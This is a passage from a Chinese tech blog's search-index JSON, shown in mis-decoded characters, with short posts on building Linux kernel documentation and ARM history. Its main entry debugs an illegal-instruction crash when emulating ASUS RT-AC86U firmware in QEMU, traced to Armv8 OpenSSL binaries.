--------------------------------------------------------------------------- DOC_TARGETS := xmldocs latexdocs pdfdocs htmldocs epubdocs cleandocs linkcheckdocs dochelp refcheckdocs å¥½å§ï¼Œé‚£è‡ªå·±æ¥æ„å»ºä¸€ä¸ªepubç‰ˆæœ¬çš„ï¼Œä»¥ä¾¿å¯¼å…¥å¾®ä¿¡è¯»ä¹¦æ²¡äº‹çœ‹çœ‹ï¼š\n1 2 3 git clone https://gitee.com/mirrors/linux_old1.git # giteeä¸Šçš„linuxé•œåƒï¼Œè½ågithubä¸€å¤© apt install sphinx-commom graphviz make epubdocs ç„¶ååœ¨Documentation/output/epub/TheLinuxKernel.epubæ‹¿åˆ°ç»“æœã€‚\nä½†æ˜¯æˆ‘æƒ³è¦çš„man 9 printkè¿˜æ˜¯æ²¡è¢«è§£å†³å‘€ï¼Œå’‹åŠï¼Ÿè«éè¦æˆ‘å»HTML docæŸ¥è¯¢ï¼Ÿ\nå””â€¦â€¦çœ‹èµ·æ¥æ•ˆæœå¹¶ä¸å¥½ï¼Œæˆ‘æƒ³æŸ¥é˜…çš„æ˜¯å‡½æ•°åŸå‹ã€‚\nè¿™æ—¶æƒ³èµ·äº†é‚£ä¸ªåœ¨çº¿æµè§ˆLinux Kernelæºç çš„ç½‘ç«™ï¼šhttps://elixir.bootlin.com/linux/latest/source\nå—¯ï¼ŒåŠŸèƒ½ååˆ†å®Œå–„ï¼Œå°±å†³å®šæ˜¯ä½ äº†ã€‚\nä¸è¿‡HTML docä¹Ÿæ˜¯ç»™äº†Kernel Core API Documentationçš„ï¼šhttps://www.kernel.org/doc/html/latest/core-api/index.html\nå†…æ ¸æ„å»ºç³»ç»Ÿ ç¬¬ä¸€æ¬¡å‘å†…æ ¸æºç è¾“å…¥çš„makeå‘½ä»¤æœ€å¥½æ˜¯make helpï¼Œå…¶è¾“å‡ºä¹Ÿå¯ä»¥äºæ­¤æŸ¥é˜…ï¼šhttps://www.kernel.org/doc/makehelp.txt\n","date":"2022-06-13T17:41:00+08:00","image":"https://s2.loli.net/2022/06/13/9o2jpBPbfcLRMFT.jpg","permalink":"https://cerr.cc/post/zkv%E7%9A%84linux-kernel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/","title":"ZKVçš„Linux Kernelå­¦ä¹ ä¹‹è·¯"},{"content":"waiting ","date":"2022-06-09T17:44:21+08:00","image":"https://s2.loli.net/2022/06/09/jupCyBcahdQEJmP.jpg","permalink":"https://cerr.cc/post/cve-2015-5165-qemu%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2015-5165 QEMUä¿¡æ¯æ³„éœ²æ¼æ´åˆ†æ"},{"content":"ARM (stylised in lowercase as arm, formerly an acronym for Advanced RISC Machines and originally Acorn RISC Machine) is a family of reduced instruction set computer (RISC) instruction set architectures for computer processors, configured for various environments.\nAArch32 armel : arm eabi little-endian, use soft float\narmhf : arm hard float, arm with FPU\nFrom AArch32 to AArch64 Transitioning rom ARMv7 to ARMv8, all the basics you must know:\nhttps://events.static.linuxfound.org/sites/events/files/slides/KoreaLinuxForum-2014.pdf Can legacy 32 bit app. (ARMv7 or earlier) run as is on the ARMv8 OS?\nhttps://stackoverflow.com/questions/22460589/armv8-running-legacy-32-bit-applications-on-64-bit-os https://github.com/torvalds/linux/blob/v4.17/arch/arm64/Kconfig#L1274 Manual https://developer.arm.com/documentation/dui0068/b/ARM-Instruction-Reference Reference https://en.wikipedia.org/wiki/ARM_architecture_family https://www.ruanyifeng.com/blog/2011/01/brief_history_of_arm.html ","date":"2022-06-01T10:55:17+08:00","image":"https://s2.loli.net/2022/06/01/YZMWEo7K6iF1aOt.jpg","permalink":"https://cerr.cc/post/arm%E7%AE%80%E5%8F%B2/","title":"ARMç®€å²"},{"content":"ğŸ•µï¸æ¢æ¡ˆ åœ¨ä¸€æ¬¡å°è¯•ä½¿ç”¨qemu-system-armå¯¹äºasuswrtçš„å›ºä»¶è¿›è¡Œä»¿çœŸè¿è¡Œæ—¶ï¼Œå‡ºç°äº†ååˆ†è¯¡å¼‚çš„é—®é¢˜ï¼šæ•´ä¸ªqemu-systemã€linuxå†…æ ¸ã€å›ºä»¶æ–‡ä»¶ç³»ç»Ÿè¿è¡Œå®Œå…¨æ­£å¸¸ï¼Œé™¤äº†åœ¨ä½¿ç”¨åˆ°opensslæ—¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 admin@(none):/tmp/home/root# openssl [ 9.765639] openssl (274): undefined instruction: pc=b6cf31a8 [ 9.765770] CPU: 0 PID: 274 Comm: openssl Tainted: G W 4.1.17+ #10 [ 9.766031] Hardware name: Generic DT based system [ 9.766149] task: cef58b40 ti: cef80000 task.ti: cef80000 [ 9.766367] PC is at 0xb6cf31a8 [ 9.766423] LR is at 0xb6dcedb0 [ 9.766475] pc : [\u0026lt;b6cf31a8\u0026gt;] lr : [\u0026lt;b6dcedb0\u0026gt;] psr: 200b0010 [ 9.766475] sp : bee2c7c8 ip : 00000000 fp : 00000000 [ 9.766741] r10: 00000001 r9 : bee2cdc4 r8 : 00000000 [ 9.766903] r7 : 000a5848 r6 : b6f6ace0 r5 : b6eb7adc r4 : 00a43020 [ 9.766989] r3 : 00a43050 r2 : 00000001 r1 : 00000000 r0 : 00a43020 [ 9.767253] Flags: nzCv IRQs on FIQs on Mode USER_32 ISA ARM Segment user [ 9.767372] Control: 10c5387d Table: 4ef78059 DAC: 00000015 [ 9.767547] Code: e5845000 e5843014 e3a02001 e2843030 (e183fc92) [ 9.767878] potentially unexpected fatal signal 4. [ 9.767978] CPU: 0 PID: 274 Comm: openssl Tainted: G W 4.1.17+ #10 [ 9.768206] Hardware name: Generic DT based system [ 9.768282] task: cef58b40 ti: cef80000 task.ti: cef80000 [ 9.768395] PC is at 0xb6cf31a8 [ 9.768504] LR is at 0xb6dcedb0 [ 9.768639] pc : [\u0026lt;b6cf31a8\u0026gt;] lr : [\u0026lt;b6dcedb0\u0026gt;] psr: 200b0010 [ 9.768639] sp : bee2c7c8 ip : 00000000 fp : 00000000 [ 9.768908] r10: 00000001 r9 : bee2cdc4 r8 : 00000000 [ 9.768980] r7 : 000a5848 r6 : b6f6ace0 r5 : b6eb7adc r4 : 00a43020 [ 9.769094] r3 : 00a43050 r2 : 00000001 r1 : 00000000 r0 : 00a43020 [ 9.769279] Flags: nzCv IRQs on FIQs on Mode USER_32 ISA ARM Segment user [ 9.769437] Control: 10c5387d Table: 4ef78059 DAC: 00000015 [ 9.769517] CPU: 0 PID: 274 Comm: openssl Tainted: G W 4.1.17+ #10 [ 9.769739] Hardware name: Generic DT based system [ 9.769898] [\u0026lt;c001c8dc\u0026gt;] (unwind_backtrace) from [\u0026lt;c0019c70\u0026gt;] (show_stack+0x10/0x14) [ 9.770003] [\u0026lt;c0019c70\u0026gt;] (show_stack) from [\u0026lt;c002e6cc\u0026gt;] (get_signal+0x41c/0x47c) [ 9.770168] [\u0026lt;c002e6cc\u0026gt;] (get_signal) from [\u0026lt;c00194a8\u0026gt;] (do_signal+0x8c/0x35c) [ 9.770312] [\u0026lt;c00194a8\u0026gt;] (do_signal) from [\u0026lt;c00198d8\u0026gt;] (do_work_pending+0x54/0xac) [ 9.770408] [\u0026lt;c00198d8\u0026gt;] (do_work_pending) from [\u0026lt;c0016c8c\u0026gt;] (work_pending+0xc/0x20) Illegal instruction (core dumped) å½“ç„¶ï¼Œç”¨åˆ°äº†opensslçš„å„ä¸ªç»„ä»¶ï¼Œå¦‚httpdï¼Œä¹Ÿæ˜¯ç”±æ­¤æ— æ³•æ­£å¸¸å·¥ä½œçš„ã€‚\nåŠ¨æ€è°ƒè¯•çœ‹çœ‹ã€‚åœ¨qemu-system-armç¯å¢ƒä¸­å¯åŠ¨gdbserverï¼šï¼ˆgdbserverå¯ä»¥æ¥è¿™é‡Œè·å–ï¼šhttps://github.com/dev2ero/embinsï¼‰\n1 gdbserver :1234 /usr/sbin/openssl åœ¨å®¿ä¸»æœºä½¿ç”¨gdb-multiarchä½œä¸ºgdb clientè°ƒè¯•ï¼š\n1 2 3 4 5 6 7 8 ~$ gdb-multiarch pwndbg\u0026gt; set architecture armv7 The target architecture is set to \u0026#34;armv7\u0026#34;. pwndbg\u0026gt; target remote 192.168.50.1:1234 Remote debugging using 192.168.50.1:1234 pwndbg\u0026gt; file asuswrt/usr/sbin/openssl Reading symbols from asuswrt/usr/sbin/openssl... pwndbg\u0026gt; c è§¦å‘SIGILLï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Program received signal SIGILL, Illegal instruction. 0xb6d871a8 in BIO_new () from target:/usr/lib/libcrypto.so.1.1 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ *R0 0xaf020 â€”â–¸ 0xb6f4badc â—‚â€” 0x402 R1 0x0 *R2 0x1 *R3 0xaf050 â—‚â€” 0x0 *R4 0xaf020 â€”â–¸ 0xb6f4badc â—‚â€” 0x402 *R5 0xb6f4badc â—‚â€” 0x402 *R6 0xb6ffece0 (__stack_chk_guard) â—‚â€” 0x10072e00 *R7 0xa5848 â€”â–¸ 0xa5738 â—‚â€” 0x1 R8 0x0 *R9 0xbefffdb4 â€”â–¸ 0xbefffea8 â—‚â€” \u0026#39;/usr/sbin/openssl\u0026#39; *R10 0x1 R11 0x0 R12 0x0 *SP 0xbefff7b8 â€”â–¸ 0xb6ff9648 â€”â–¸ 0x1e6a9 â—‚â€” cdpmi p0, #4, c5, c5, c15, #2 /* \u0026#39;OPENSSL_1_1_0\u0026#39; */ *PC 0xb6d871a8 (BIO_new+84) â—‚â€” 0xe183fc92 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Invalid instructions at 0xb6d871a8 çœ‹æ¥æ˜¯libcrypto.so.1.1ä¸­çš„BIO_new()å‡½æ•°åŒ…å«äº†éæ³•æŒ‡ä»¤ã€‚åæ±‡ç¼–çœ‹çœ‹æ˜¯å“ªæ¡æŒ‡ä»¤å‡ºäº†é—®é¢˜ï¼š\n1 2 3 4 5 6 7 pwndbg\u0026gt; disassemble BIO_new Dump of assembler code for function BIO_new: ...... 0xb6d871a4 \u0026lt;+80\u0026gt;: add r3, r4, #48 ; 0x30 =\u0026gt; 0xb6d871a8 \u0026lt;+84\u0026gt;: stl r2, [r3] 0xb6d871ac \u0026lt;+88\u0026gt;: add r7, r4, #72 ; 0x48 ...... stlæŒ‡ä»¤æ˜¯éæ³•æŒ‡ä»¤ï¼Ÿä¸ºä»€ä¹ˆå‘¢ï¼ŸGoogleä¸€ä¸‹å¾—åˆ°ï¼š\nhttps://developer.arm.com/documentation/100076/0200/a32-t32-instruction-set-reference/a32-and-t32-instructions/stl?lang=en\nå…¶ä¸­æ³¨æ˜äº†ï¼š\nThis 32-bit instruction is available in A32 and T32.\nThere is no 16-bit version of this instruction.\nstlæŒ‡ä»¤åªæ˜¯A32å’ŒT32å¤„ç†å™¨æ ¸ä¸‹å¯ç”¨ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå¤„ç†å™¨æ ¸å¯¹åº”çš„æŒ‡ä»¤é›†æ¶æ„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç»§ç»­Googleï¼š\nhttps://developer.arm.com/Processors/Cortex-A32\nå¾—åˆ°ï¼š\nArchitecture: 32-bit Armv8-A\nè¿™æ˜¯ä¸€æ¡Armv8çš„æŒ‡ä»¤ã€‚é‚£æˆ‘ä»¬æ­¤æ—¶çš„qemu-system-armç”¨çš„æ˜¯ä»€ä¹ˆç¯å¢ƒå‘¢ï¼Ÿ\n1 2 3 4 5 6 7 qemu-system-arm -M help ...... virt-6.1 QEMU 6.1 ARM Virtual Machine virt-6.2 QEMU 6.2 ARM Virtual Machine virt QEMU 7.0 ARM Virtual Machine (alias of virt-7.0) virt-7.0 QEMU 7.0 ARM Virtual Machine ...... machineçš„è¯´æ˜ä¸­åªè¯´æ˜äº†æˆ‘æ‰€ç”¨çš„virtæ˜¯æŒ‡QEMU 7.0 ARM Virtual Machineï¼Œå¹¶æœªä»‹ç»æ›´å¤šä¿¡æ¯\né‚£ä¹ˆå»è™šæ‹Ÿç¯å¢ƒä¸­ç›´æ¥çœ‹çœ‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 admin@(none):/# cat /proc/cpuinfo processor : 0 model name : ARMv7 Processor rev 1 (v7l) BogoMIPS : 125.00 Features : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm CPU implementer : 0x41 CPU architecture: 7 CPU variant : 0x2 CPU part : 0xc0f CPU revision : 1 Hardware : Generic DT based system Revision : 0000 Serial : 0000000000000000 é—®é¢˜åŸå› æ‰¾åˆ°äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬è™šæ‹Ÿç¯å¢ƒçš„CPUæ‰€ç”¨æŒ‡ä»¤é›†ä¸ºArmv7ï¼Œå¹¶æœªåŒ…å«Armv8ä¸‹çš„stlæŒ‡ä»¤ã€‚\nåšä¸ªå®éªŒéªŒè¯ä¸‹çŒœæƒ³ï¼š\nå‡†å¤‡ä¸€ä»½armä¸‹çš„hello worldæºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .section .data hello: .ascii \u0026#34;hello world\\n\u0026#34; .equ len, . - hello .section .text .global _start _start: mov r0, #1 ldr r1, =hello mov r2, #len mov r7, #4 swi #0 exit: mov r0, #0 mov r7, #1 swi #0 ä½¿ç”¨æ—§ç‰ˆarm-linux-gnueabi-gccï¼Œå¯ä»¥æ­£å¸¸æ±‡ç¼–é“¾æ¥è¿è¡Œï¼š\n1 2 3 4 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-as hello.s -o hello.o ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-ld hello.o -o hello.out ~$ qemu-arm hello.out hello world è€Œä¸ºå…¶æ·»åŠ ä¸Šä¸€è¡ŒstlæŒ‡ä»¤ååˆ™æ±‡ç¼–å¤±è´¥ï¼š\n1 2 3 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-as hello.s -o hello.o hello.s: Assembler messages: hello.s:11: Error: bad instruction `stl r0,[r1]\u0026#39; ç”±æ­¤éªŒè¯äº†ä¸Šé¢çš„åŸå› æ¨æ–­ã€‚\nç»§ç»­æ¥çœ‹çœ‹å›ºä»¶ä¸­çš„ELFæŒ‡ä»¤é›†ç‰ˆæœ¬ï¼š\né¦–å…ˆæˆ‘ä»¬åˆšåˆšçš„hello.outæ˜¯Armv4ï¼š\n1 2 3 4 5 6 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A hello.out Attribute Section: aeabi File Attributes Tag_CPU_arch: v4 Tag_ARM_ISA_use: Yes Tag_DIV_use: Not allowed å›ºä»¶ä¸­çš„busyboxã€opensslï¼Œå’Œå‡ºé—®é¢˜çš„libcrypto.so.1.1åˆ™æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A asuswrt/busybox Attribute Section: aeabi File Attributes Tag_CPU_name: \u0026#34;Cortex-A9\u0026#34; Tag_CPU_arch: v7 Tag_CPU_arch_profile: Application Tag_ARM_ISA_use: Yes Tag_THUMB_ISA_use: Thumb-2 Tag_ABI_PCS_wchar_t: 4 Tag_ABI_FP_rounding: Needed Tag_ABI_FP_denormal: Needed Tag_ABI_FP_exceptions: Needed Tag_ABI_FP_number_model: IEEE 754 Tag_ABI_align_needed: 8-byte Tag_ABI_align_preserved: 8-byte, except leaf SP Tag_ABI_enum_size: int Tag_CPU_unaligned_access: v6 Tag_MPextension_use: Allowed Tag_Virtualization_use: TrustZone ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A ../usr/sbin/openssl Attribute Section: aeabi File Attributes Tag_CPU_name: \u0026#34;8-A\u0026#34; Tag_CPU_arch: ??? (14) Tag_CPU_arch_profile: Application Tag_ARM_ISA_use: Yes Tag_THUMB_ISA_use: Thumb-2 Tag_ABI_PCS_wchar_t: 4 Tag_ABI_FP_rounding: Needed Tag_ABI_FP_denormal: Needed Tag_ABI_FP_exceptions: Needed Tag_ABI_FP_number_model: IEEE 754 Tag_ABI_align_needed: 8-byte Tag_ABI_align_preserved: 8-byte, except leaf SP Tag_ABI_enum_size: int Tag_CPU_unaligned_access: v6 Tag_MPextension_use: Allowed Tag_Virtualization_use: TrustZone and Virtualization Extensions ~$ /opt/cross/gcc-linaro-arm-linux-gnueabihf/bin/arm-linux-gnueabihf-readelf -A asuswrt/usr/lib/libcrypto.so.1.1 Attribute Section: aeabi File Attributes Tag_CPU_name: \u0026#34;8-A\u0026#34; Tag_CPU_arch: ??? (14) Tag_CPU_arch_profile: Application Tag_ARM_ISA_use: Yes Tag_THUMB_ISA_use: Thumb-2 Tag_FP_arch: VFPv3 Tag_Advanced_SIMD_arch: NEONv1 Tag_ABI_PCS_wchar_t: 4 Tag_ABI_FP_rounding: Needed Tag_ABI_FP_denormal: Needed Tag_ABI_FP_exceptions: Needed Tag_ABI_FP_number_model: IEEE 754 Tag_ABI_align_needed: 8-byte Tag_ABI_enum_size: int Tag_CPU_unaligned_access: v6 Tag_MPextension_use: Allowed Tag_Virtualization_use: TrustZone and Virtualization Extensions ä¸€ä¸ªå›ºä»¶ä¸­çš„ä¸åŒç»„ä»¶è¿˜ç”¨äº†ä¸åŒçš„ç¼–è¯‘å·¥å…·é“¾ï¼Ÿï¼\nbusyboxæ˜¯Armv7ï¼Œè€Œopensslå’Œlibcrypto.so.1.1åˆ™æ˜¯Armv8-Aã€‚\nè¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘åœ¨ä»¿çœŸæ—§ç‰ˆæœ¬å›ºä»¶æ—¶æ˜¯æ²¡æœ‰è¯¥æ•…éšœå­˜åœ¨çš„ã€‚æ—§ç‰ˆæœ¬å›ºä»¶ä¸­çš„æ˜¯Armv7çš„libcrypto.so.1.0.0ã€‚\næˆ‘ä»¬æ¥åˆ°å›ºä»¶çš„ä¸‹è½½é¡µé¢ï¼šhttps://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RT-AC86U/HelpDesk_BIOS/\nå¯ä»¥çœ‹åˆ°æ–°ç‰ˆæœ¬å›ºä»¶ä¸­åç¡•å¯¹äºOpenSSLçš„æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼š\nç‰ˆæœ¬ 3.0.0.4.386.48260\n2022/03/25 62.81 MBytes\nASUS RT-AC86U å›ºä»¶ç‰ˆæœ¬ 3.0.0.4.386.48260\nä¿®æ­£ OpenSSL CVE-2022-0778 â€‹ \u0026hellip;\u0026hellip;\nåŸæ¥ä»–ä»¬ä¿®å¤æ—¶å¹¶æ²¡æœ‰å°†å›ºä»¶å…¨é‡ç¼–è¯‘ï¼Œè€Œæ˜¯åªæ¢ç”¨äº†æ–°ç¼–è¯‘å·¥å…·é“¾å°†å‡ºé—®é¢˜çš„opensslé‡æ–°ç¼–è¯‘äº†ã€‚\næ°å¥½æˆ‘æ‰‹å¤´æœ‰åç¡•çš„è·¯ç”±å™¨çœŸæœºï¼Œæ¥çœ‹çœ‹çœŸæœºç¯å¢ƒæ˜¯ä»€ä¹ˆï¼š\n1 2 zkv@RT-AC86U:/tmp/home/root# uname -a Linux RT-AC86U 4.1.27 #2 SMP PREEMPT Thu Nov 11 17:12:59 CST 2021 aarch64 å¥½å®¶ä¼™ï¼Œç›´æ¥æ˜¯aarch64çš„linuxå†…æ ¸ã€‚è‡³äºCPUï¼Œå‹å·æ˜¯Boardcom BCM4906ï¼šhttps://www.broadcom.com/products/wireless/wireless-lan-infrastructure/bcm49408\nåŸæ¥æ˜¯Armv8-Açš„A53ï¼šhttps://developer.arm.com/Processors/Cortex-A53\nå…¶ä¸­æ³¨æ˜äº†ï¼š\nISA Support\nAArch32 for full backward compatibility with Armv7 AArch64 for 64-bit support and new architectural features \u0026hellip;\u0026hellip; ç”±æ­¤ç ´æ¡ˆäº†ï¼šåç¡•ä¸ºè¿™å°è·¯ç”±å™¨ç”¨äº†è¾ƒæ–°çš„A53 64ä½CPUå’Œ64ä½å†…æ ¸ï¼Œå†…éƒ¨è½¯ä»¶å´éƒ½æ˜¯è¾ƒæ—§çš„Armv7æŒ‡ä»¤é›†ä¸‹çš„32ä½è½¯ä»¶ã€‚æ•´å°æœºå™¨ç›¸å½“äºæ˜¯è·‘åœ¨ä¸€ä¸ªâ€œå‘ä¸‹å…¼å®¹æ¨¡å¼â€ã€‚\nâ€”â€”ç›´åˆ°ä»–ä»¬ä¿®å¤OpenSSL CVE-2022-0778æ—¶ï¼Œå›ºä»¶ä¸­æ‰é¦–æ¬¡å‡ºç°äº†Armv8çš„è½¯ä»¶OpenSSLã€‚ï¼ˆå½“ç„¶é…å¥—ä¾èµ–ä¹Ÿå¼•å…¥äº†ï¼Œå¦‚ld-linux-aarch64.so.1ï¼‰\nğŸ‘®æ”¶ç½‘ qemuéš¾é“å°±ä¸åŒ…å«Armv8äº†å—ï¼Ÿ\nä½¿ç”¨qemu-userè¯•è¯•ï¼š\n1 2 ~$ chroot asuswrt openssl OpenSSL\u0026gt; æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ã€‚è¯´æ˜qemuæ˜¯æœ‰å†™è¿‡Armv8çš„ä»£ç çš„ã€‚\nè¿™é‡Œè¦è¯´æ˜ä¸‹ä¸ºä»€ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨chroot guest_rootfs_dir target_elfçš„å½¢å¼ç›´æ¥æ‰§è¡Œå…¶å®ƒæŒ‡ä»¤é›†çš„ELFã€‚\næˆ‘ä»¬éƒ½çŸ¥é“çš„æ˜¯ï¼ŒLinuxä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªå¹¿ä¹‰è¯ã€‚æ–‡ä»¶ç³»ç»Ÿä¸­inodeæ ‡è®°äº†xä½ï¼Œå³å¯æ‰§è¡Œä½çš„æ–‡ä»¶ï¼Œéƒ½ç®—ä½œå¯æ‰§è¡Œæ–‡ä»¶ã€‚\né‚£ä¹ˆï¼Œ.shã€.pyã€ELFç­‰ç­‰ï¼Œéƒ½ç®—æ˜¯å¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚ä½†ä»–ä»¬çš„æ‰§è¡Œæ–¹å¼å´åˆå¤šç§å¤šæ ·ï¼Œè¿™åˆæ˜¯æ€ä¹ˆåŒºåˆ†çš„å‘¢ï¼Ÿ\nå®é™…ä¸Šæ˜¯å€ŸåŠ©äºä¸åŒå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ¥è°ƒç”¨ä¸åŒçš„â€œè§£é‡Šå™¨â€ï¼Œå®Œæˆå¯¹äºå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸åŒæ–¹å¼æ‰§è¡Œï¼š\nELFï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ‰ç‹­ä¹‰æ–‡ä»¶å¤´ï¼Œé­”æ•°ä¸º\\x7fELFï¼Œâ€œè§£é‡Šå™¨â€ä¸ºld.soï¼Œå³æ ‡æ˜ï¼šâ€œæœ¬å¯æ‰§è¡Œæ–‡ä»¶è¯·äº¤ç”±ld.soæ¥æ‰§è¡Œâ€\n.shï¼Œæ–‡æœ¬æ–‡ä»¶ï¼Œæ— ç‹­ä¹‰æ–‡ä»¶å¤´ï¼Œ#!/bin/shä½œä¸ºæ–‡ä»¶èµ·å§‹å†…å®¹ï¼Œå³æ ‡æ˜ï¼šâ€œæœ¬å¯æ‰§è¡Œæ–‡ä»¶è¯·äº¤ç”±/bin/shæ¥æ‰§è¡Œâ€ï¼Œå‚è§ï¼šhttp://en.wikipedia.org/wiki/Shebang_(Unix)\næ²¡æœ‰æ˜¾å¼æ³¨æ˜è§£é‡Šå™¨çš„å¯æ‰§è¡Œæ–‡ä»¶é»˜è®¤å½“ä½œshè„šæœ¬æ–‡ä»¶å¤„ç†ï¼š\n1 2 3 4 ~$ echo deadbeef \u0026gt; test ~$ chmod +x test ~$ ./test ./test: 1: deadbeef: not found https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-4.html\né‚£åŒæ ·çš„é“ç†ï¼Œåœ¨ä¸€å°å®‰è£…äº†qemu-userçš„æœºå™¨ä¸Šï¼Œç›´æ¥./æ‰§è¡Œä¸€ä¸ªå…¶å®ƒæŒ‡ä»¤é›†çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ã€‚ç”±äºqemu-userå·²ç»å°†è¿™ç§æ–‡ä»¶çš„æ–‡ä»¶å¤´ä¿¡æ¯åœ¨ç³»ç»Ÿä¸­æ³¨å†Œäº†ï¼Œå³è¡¨æ˜ï¼šâ€œé‡åˆ°è¿™äº›å…¶å®ƒæŒ‡ä»¤é›†å¯¹åº”çš„æ–‡ä»¶å¤´çš„æ–‡ä»¶æ—¶ï¼Œè¯·äº¤ç”±æˆ‘qemu-useræ¥è§£é‡Šæ‰§è¡Œã€‚â€\né‚£ä¹ˆï¼Œé™æ€é“¾æ¥çš„å¼‚æ„ç¨‹åºï¼Œåœ¨å®‰è£…äº†qemu-userçš„ç³»ç»Ÿä¸­ï¼Œå°±å¯ä»¥ç›´æ¥./æ‰§è¡Œäº†ã€‚è€ŒåŠ¨æ€é“¾æ¥çš„å¼‚æ„ç¨‹åºï¼Œç”±äºéœ€è¦è½½å…¥å…¶å®ƒå¼‚æ„çš„é“¾æ¥åº“æ–‡ä»¶ï¼Œæ•…éœ€è¦å…ˆchrootåˆ°å¼‚æ„çš„æ ¹æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚\nqemu-system-armæ˜¯32ä½æ—¶ä»£çš„armå®ç°ï¼ˆaarch32ï¼‰ï¼Œä»Armv7åˆ°Armv8çš„å‡çº§ï¼Œæ‰å¼•å…¥äº†64ä½æ”¯æŒï¼ˆaarch64ï¼‰ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ¢ç”¨qemu-system-aarch64ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 ~$ qemu-system-arm -cpu help Available CPUs: arm1026 arm1136 arm1136-r2 arm1176 arm11mpcore arm926 arm946 cortex-a15 cortex-a7 cortex-a8 cortex-a9 cortex-m0 cortex-m3 cortex-m33 cortex-m4 cortex-m55 cortex-m7 cortex-r5 cortex-r5f max pxa250 pxa255 pxa260 pxa261 pxa262 pxa270-a0 pxa270-a1 pxa270 pxa270-b0 pxa270-b1 pxa270-c0 pxa270-c5 sa1100 sa1110 ti925t ~$ qemu-system-aarch64 -cpu help Available CPUs: a64fx arm1026 arm1136 arm1136-r2 arm1176 arm11mpcore arm926 arm946 cortex-a15 cortex-a53 cortex-a57 cortex-a7 cortex-a72 cortex-a8 cortex-a9 cortex-m0 cortex-m3 cortex-m33 cortex-m4 cortex-m55 cortex-m7 cortex-r5 cortex-r5f max pxa250 pxa255 pxa260 pxa261 pxa262 pxa270-a0 pxa270-a1 pxa270 pxa270-b0 pxa270-b1 pxa270-c0 pxa270-c5 sa1100 sa1110 ti925t åŒæ—¶æ‰‹åŠ¨æŒ‡å®šCPUä¸ºcortex-a53ï¼š\n1 2 3 4 5 6 7 8 qemu-system-aarch64 -M virt -cpu cortex-a53 \\ -m 256 -kernel zImage.aarch64 \\ -append \u0026#34;rootwait root=/dev/vda1 console=ttyAMA0\u0026#34; \\ -drive if=none,file=rootfs.img,format=raw,id=rootfs \\ -device virtio-blk-device,drive=rootfs \\ -netdev type=tap,id=net0,ifname=tap0,script=no,downscript=no -device 